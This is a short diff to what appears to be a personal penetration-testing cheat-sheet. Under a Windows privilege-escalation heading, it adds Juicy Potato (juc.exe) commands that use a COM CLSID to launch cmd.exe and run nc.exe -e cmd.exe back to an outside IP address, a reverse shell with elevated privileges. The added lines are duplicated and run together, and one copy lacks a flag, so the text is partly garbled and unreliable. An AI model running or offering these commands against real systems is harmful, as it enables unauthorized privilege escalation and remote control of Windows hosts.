@@ -57,6 +57,9 @@ Privilege Escalation:-
 	Windows:-
 		
 		seBackupPrivilege //related to backup https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
+		
+		juc.exe -l 1337 -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.246 21"
+juc.exe -l 1337 -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe "/c c:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.246 21"juc.exe -l 1337 -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.246 21" //juicy potato for windows 2008
 	
 
  Enumeration:-
